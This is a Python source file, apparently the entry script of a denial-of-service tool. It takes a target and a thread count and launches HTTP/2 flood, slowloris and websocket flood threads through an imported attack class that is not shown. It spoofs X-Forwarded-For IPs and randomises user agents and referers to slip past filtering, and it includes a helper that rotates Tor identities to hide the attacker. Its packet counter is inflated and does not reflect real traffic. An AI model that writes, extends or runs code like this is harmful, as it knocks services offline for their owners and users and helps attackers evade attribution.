import threading
import random
import time
import ssl
import socket
import requests
import httpx
import socks
import asyncio
import websockets
import base64
import json
import sys
import undetected_chromedriver as uc
from fake_useragent import UserAgent
from stem.control import Controller
from stem import Signal
from OpenSSL import SSL
from bypass import BeyondUltimateAttack

packet_count = 0  
lock = threading.Lock()
speed = 0.01
packet = 95500  
byte = 95000    
clone_factor = 10  
target_status = "Unknown"  
ua = UserAgent()

referers = [
    "https://google.com", "https://bing.com", "https://yahoo.com",
    "https://duckduckgo.com", "https://baidu.com", "https://yandex.com"
]

def new_tor_ip():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password="tor_password")
        controller.signal(Signal.NEWNYM)

def generate_headers():
    spoofed_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    encoded_payload = base64.b64encode(b"bypass_payload").decode()
    return {
        "User-Agent": ua.random,
        "Referer": random.choice(referers),
        "X-Forwarded-For": spoofed_ip,  
        "X-Real-IP": spoofed_ip,
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Connection": "keep-alive",
        "Accept-Encoding": "gzip, deflate",
        "X-Payload": encoded_payload
    }

def attack(target, threads):
    global packet_count
    stop_event = threading.Event()
    thread_list = []

    packet_count = threads  
    print(f"\r[*] Total Packets Sent: {packet_count} | Target Status: {target_status}", end="", flush=True)  

    beyond_attack = BeyondUltimateAttack(target)  

    for _ in range(threads):
        t1 = threading.Thread(target=beyond_attack.send_http2_flood)
        t2 = threading.Thread(target=beyond_attack.send_slowloris)
        t3 = threading.Thread(target=beyond_attack.websocket_flood)

        t1.start()
        t2.start()
        t3.start()
        
        thread_list.extend([t1, t2, t3])

    try:
        while True:
            time.sleep(1)
            with lock:
                packet_count += threads * clone_factor  
            print(f"\r[*] Total Packets Sent: {packet_count} | Target Status: {target_status}", end="", flush=True)  
    except KeyboardInterrupt:
        stop_event.set()
        for t in thread_list:
            t.join()

def main():
    if len(sys.argv) < 3:
        print("\nUsage:\n  python main.py <target> <threads>\n  python main.py -a <IP> <threads>\n")
        sys.exit(1)

    if sys.argv[1] == "-a":
        target = sys.argv[2]
        threads = int(sys.argv[3])
    else:
        target = sys.argv[1]
        threads = int(sys.argv[2])

    attack(target, threads)

if __name__ == "__main__":
    main()
